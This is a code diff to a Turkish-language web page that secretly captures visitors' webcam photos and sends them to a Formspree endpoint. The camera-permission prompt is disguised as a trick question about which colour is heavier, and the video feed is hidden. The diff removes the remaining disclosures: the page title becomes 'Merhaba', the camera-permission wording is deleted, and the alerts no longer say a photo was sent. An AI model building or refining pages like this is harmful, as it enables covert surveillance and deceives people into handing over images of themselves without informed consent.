@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Camera Access and Photo Submission</title>
+  <title>Merhaba</title>
   <style>
     #videoElement {
       display: none;
@@ -16,7 +16,7 @@
 
   <form id="photoForm">
     <!-- Karmaşık bir soru gibi görünen izin sorusu -->
-    <label for="permission">Hangi renk daha ağırdır, mavi mi kırmızı mı? <br>(Kameraya erişim izni)</label><br>
+    <label for="permission">Hangi renk daha ağırdır, mavi mi kırmızı mı? <br>()</label><br>
     <input type="radio" name="permission" value="yes"> Kırmızı <br>
     <input type="radio" name="permission" value="no"> Mavi <br><br>
 
@@ -43,7 +43,7 @@
             video.style.display = 'none'; // Kamera görünmesin
           })
           .catch(function(err) {
-            alert('Kamera erişimi reddedildi: ' + err);
+            alert(' Erişimi reddedildi: ' + err);
           });
 
         // Fotoğrafı çekip Formspree ile gönder
@@ -69,7 +69,7 @@
           })
           .then(response => response.json())
           .then(data => {
-            alert('Fotoğraf başarıyla gönderildi!');
+            alert('Yanıt başarıyla gönderildi!');
           })
           .catch(error => {
             console.error('Error:', error);
